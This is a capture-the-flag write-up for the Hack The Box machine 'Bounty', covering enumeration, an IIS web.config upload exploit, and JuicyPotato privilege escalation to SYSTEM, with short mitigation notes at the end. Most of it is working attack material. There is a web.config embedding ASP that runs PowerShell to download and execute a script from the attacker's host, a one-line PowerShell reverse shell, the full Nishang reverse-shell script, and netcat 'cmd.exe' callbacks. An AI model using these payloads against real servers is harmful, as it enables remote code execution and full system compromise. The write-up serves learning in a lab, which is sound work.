# Bounty

```
kali@kali:~/htb/Bounty$ sudo nmap -sV -sC 10.129.90.62
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-31 13:54 EST
Nmap scan report for bounty.htb (10.129.90.62)
Host is up (0.031s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds
kali@kali:~/htb/Bounty$
```

So we got a wepbage. I open it up, and it’s just an image of merlin. Nothing else really.

 I run wfuzz on directories, I find an UploadedFiles folder, so i run wfuzz with txt files, php files, and then aspx files. 

```
kali@kali:~/htb/Bounty$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://bounty.htb/FUZZ.aspx
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.0.1 - The Web Fuzzer                         *
********************************************************

Target: http://bounty.htb/FUZZ.aspx
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                  
===================================================================

000000001:   200        31 L     53 W     630 Ch      "# directory-list-2.3-medium.txt"                                                                                                        
000000007:   200        31 L     53 W     630 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                        
000000003:   200        31 L     53 W     630 Ch      "# Copyright 2007 James Fisher"                                                                                                          
000000012:   200        31 L     53 W     630 Ch      "# on atleast 2 different hosts"                                                                                                         
000000010:   200        31 L     53 W     630 Ch      "#"                                                                                                                                      
000000011:   200        31 L     53 W     630 Ch      "# Priority ordered case sensative list, where entries were found"                                                                       
000000013:   200        31 L     53 W     630 Ch      "#"                                                                                                                                      
000000009:   200        31 L     53 W     630 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                    
000000002:   200        31 L     53 W     630 Ch      "#"                                                                                                                                      
000000008:   200        31 L     53 W     630 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                             
000000004:   200        31 L     53 W     630 Ch      "#"                                                                                                                                      
000000006:   200        31 L     53 W     630 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                          
000000005:   200        31 L     53 W     630 Ch      "# This work is licensed under the Creative Commons"                                                                                     
000003783:   200        21 L     58 W     941 Ch      "transfer"

```

I find transfer.aspx which allows me to browse and upload a file. But it does not allow .aspx files. I tried a jpg file, which worked fine. 

Hmm. I google “IIS 7 upload vulnerability” And find this: https://soroush.secproject.com/blog/tag/unrestricted-file-upload/ at the top. This leads to https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/ which contains example code we can modify to get what we need.

Upon uploading and browsing to the example code it works perfectly. So now all I have to do is replace the current code with some commands.

```
<%
set s = CreateObject("WScript.shell")
set cmd = s.Exec("cmd /c powershell -c IEX(New-Object Net.Webclient).donwloadstring('http://10.10.14.69:8000/shell.ps1')" )
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

This will be the aspx code. It will download and execute the following powershell code:

```
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.69",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

And our full web.config looks like this:

``` 
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
set s = CreateObject("WScript.shell")
set cmd = s.Exec("cmd /c powershell -c IEX(New-Object Net.Webclient).downloadstring('http://10.10.14.69:8000/shell.ps1')" )
o = cmd.StdOut.Readall()
Response.write(o)
%>
```


So we need to set up our listener, and our webserver.


```
kali@kali:~/htb/Bounty$ sudo python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

and 

```
kali@kali:~/htb/Bounty$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
```

We get a connection:

```
kali@kali:~/htb/Bounty$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.90.62 49158
whoami
bounty\merlin
# whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
#
```

We have the SeImpersonatePrivilege, so we might be able to do some token impersonation to get root.

```
# netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.90.62:80        10.10.14.69:49970      CLOSE_WAIT      InHost      
  TCP    10.129.90.62:80        10.10.14.69:49982      CLOSE_WAIT      InHost      
  TCP    10.129.90.62:80        10.10.14.69:49984      ESTABLISHED     InHost      
  TCP    10.129.90.62:139       0.0.0.0:0              LISTENING       InHost      
  TCP    10.129.90.62:49158     10.10.14.69:1337       ESTABLISHED     InHost      
  TCP    [::]:80                [::]:0                 LISTENING       InHost      
  TCP    [::]:135               [::]:0                 LISTENING       InHost      
  TCP    [::]:445               [::]:0                 LISTENING       InHost      
  TCP    [::]:47001             [::]:0                 LISTENING       InHost      
  TCP    [::]:49152             [::]:0                 LISTENING       InHost      
  TCP    [::]:49153             [::]:0                 LISTENING       InHost      
  TCP    [::]:49154             [::]:0                 LISTENING       InHost      
  TCP    [::]:49155             [::]:0                 LISTENING       InHost      
  TCP    [::]:49156             [::]:0                 LISTENING       InHost      
  UDP    0.0.0.0:123            *:*                                                
  UDP    0.0.0.0:5355           *:*                                                
  UDP    10.129.90.62:137       *:*                                                
  UDP    10.129.90.62:138       *:*                                                
  UDP    [::]:123               *:*                                                
  UDP    [::]:5355              *:*                                                
#
```

Port 445 is open. I’m thinking of just using that to upload nc.exe and churrasco.exe.

I set up a smb server on my machine with `sudo impacket-smbserver smb .`

And attempt to download with:

```
# copy \\10.10.14.69\smb\nc.exe nc.exe
# dir


    Directory: C:\Windows\temp


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----         1/31/2021  10:55 PM            test                              
d----         6/10/2018   3:44 PM            vmware-SYSTEM                     
-a---         5/30/2018   3:19 AM          0 DMI5FAC.tmp                       
-a---         1/31/2021  10:56 PM      59392 nc.exe                            
-a---         6/10/2018   3:44 PM     203777 vminst.log                        
-a---         1/31/2021   6:16 PM      59269 vmware-vmsvc.log                  
-a---         6/11/2018  12:47 AM      22447 vmware-vmusr.log                  
-a---         1/31/2021   6:16 PM       1001 vmware-vmvss.log                  


#
```

I try running `churrasco.exe -d "nc.exe 10.10.14.69 1338 -e cmd.exe"`

With a netcat listener open, but it does not work.

I do have powershell possibilites though.

If you want to read more about token impersonation, read my writeup on Granny [here](https://github.com/matale14/Writeups/blob/main/HTB/Granny/Granny.MD)

I run systeminfo to get some more information to see what exploits we have available:

```
# systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          1/31/2021, 6:16:10 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,474 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,419 MB
Virtual Memory: In Use:    676 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.90.62
                                 [02]: fe80::59f:166e:580c:b0fb
                                 [03]: dead:beef::59f:166e:580c:b0fb
#
```

So we have an x64 Windows 2008 server. 

I try out powershell:

```
# C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ping 10.10.14.69
```
And on the listener since I’m not getting feedback on the shell:

```
kali@kali:~/htb/Bounty$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:15:18.803715 IP bounty.htb > 10.10.14.69: ICMP echo request, id 1, seq 1, length 40
16:15:18.803734 IP 10.10.14.69 > bounty.htb: ICMP echo reply, id 1, seq 1, length 40
16:15:19.812811 IP bounty.htb > 10.10.14.69: ICMP echo request, id 1, seq 2, length 40
16:15:19.812845 IP 10.10.14.69 > bounty.htb: ICMP echo reply, id 1, seq 2, length 40
16:15:20.814379 IP bounty.htb > 10.10.14.69: ICMP echo request, id 1, seq 3, length 40
16:15:20.814405 IP 10.10.14.69 > bounty.htb: ICMP echo reply, id 1, seq 3, length 40
16:15:21.810373 IP bounty.htb > 10.10.14.69: ICMP echo request, id 1, seq 4, length 40
16:15:21.810395 IP 10.10.14.69 > bounty.htb: ICMP echo reply, id 1, seq 4, length 40
```

So we do have powershell possibilites. 

I think I wanna try ms16-032 next.

I do attempt to run a ms16-032 powershell script with the same command we used earlier. But nothing happens.

More about Ms16-032 over at my Optimum writeup [here](https://github.com/matale14/Writeups/blob/main/HTB/Optimum/Optimum.MD) 

I decide to improve my shell a bit. As the lack of feedback is frustrating. I just use a Nishang Powershell script. Invoke-PowerShellTcp.ps1

```
kali@kali:~/htb/Bounty$ cat Invoke-PowerShellTcp.ps1
function Invoke-PowerShellTcp
{
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target.

.DESCRIPTION
This script is able to connect to a standard netcat listening on a port when using the -Reverse switch.
Also, a standard netcat can connect to this script Bind to a specific port.

The script is derived from Powerfun written by Ben Turner & Dave Hardy

.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.

.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on
the given IP and port.

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port.

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target."
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.69 -Port 1337
```
So now we have a much more useful shell:

```
kali@kali:~/htb/Bounty$ sudo rlwrap nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.90.62 49191
whoami
Windows PowerShell running as user BOUNTY$ on BOUNTY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>bounty\merlin
PS C:\windows\system32\inetsrv>
```

And I noticed that I have to specify the whole binary path to execute them. 

```
PS C:\windows\temp> C:\windows\temp\churrasco.exe -d "nc.exe 10.10.14.69 1338 -e cmd.exe"
/churrasco/-->Current User: merlin
/churrasco/-->Process is not running under NETWORK SERVICE account!
/churrasco/-->Getting NETWORK SERVICE token ...
/churrasco/-->Couldn't find NETWORK SERVICE token
PS C:\windows\temp>
```

So now we can see that we don’t have access to the NETWORK SERVICE token to use churrasco.

I try the plink.exe smb port forward again, but it does hangs.

So maybe a good old juicypotato? 

I upload it with smb again and let’s look at what we need:

```
PS C:\windows\temp> C:\windows\temp\jp.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
PS C:\windows\temp>
```

And helped by https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato we can figure out what we need to input here.

And with a simple:

```
PS C:\windows\temp> C:\windows\temp\jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\windows\temp\nc.exe -e cmd.exe 10.10.14.69 1338" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
PS C:\windows\temp>
```

Listener:

```
kali@kali:~/htb/Bounty$ sudo rlwrap nc -nlvp 1338
Listening on 0.0.0.0 1338
Connection received on 10.129.90.62 49203
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
And we got it on the default CLSID!.

So how does juicypotato work?

Originally RottenPotato leverages the privilege escalation chain based on BITS service. And then using a Man in the Middle(MitM) attack to get the privileges.
It abuses the SeImpersonate or SeAssignPrimaryToken privileges. For JuicyPotato it was discovered that there were other servers than BITS that were vulnerable. All that was needed was:
    
be instantiable by the current user, normally a “service user” which has impersonation privileges

implement the IMarshal interface

run as an elevated user (SYSTEM, Administrator, …)

More information here: http://ohpe.it/juicy-potato/ 


## Comparing myself to the official writeup:

This is why I wanted to read the official writeups after doing it myself. I learn something useful:

`Before brute-forcing file and directory names, it is worth checking if the server is vulnerable to
tilde / shortname enumeration.`

What? I don’t even know what that is.

`This vulnerability is caused by a tilde character "~" in a GET or OPTIONS request, which allows for
disclosure of 8.3 filenames (short names). In 2010, Soroush Dalili and Ali Abbasnejad discovered
the original bug (GET request). Soroush Dalili later discovered that newer IIS installations are
vulnerable with OPTIONS. If a shortname file exists, a vulnerable IIS installation will respond with
a 404, and with a 200 if the file doesn’t exist.`

Soroush Dalili sounds familiar. Oh, it was the same person that had the web.config exploit we used in this very box. 

So they use a Java based IIS shortname scanner, and this can reveal some characters of directories on the server. This can then be used to filter wordlists which will greatly speed up the fuzzing. 

After this they use the same web.config exploit that I found. After this they upload a meterpreter shell, and use the windows exploit suggester to quickly find and execute a privesc exploit.


## How to stop this exploit:

Good job limiting .aspx and other similar files to be uploaded. Could probably also just exclude web.config from being uploaded, and it would be fixed.

On the privesc. The user had access to all binaries, I’m sure the user does not need powershell access. 

As for the escalation itself, even the creators of juicypotato state that it is very hard to stop:

`It’s nearly impossible to prevent the abuse of all these COM Servers. You could think to modify the permissions of these objects via DCOMCNFG but good luck, this is gonna be challenging.

The actual solution is to protect sensitive accounts and applications which run under the * SERVICE accounts. Stopping DCOM would certainly inhibit this exploit but could have a serious impact on the underlying OS.`
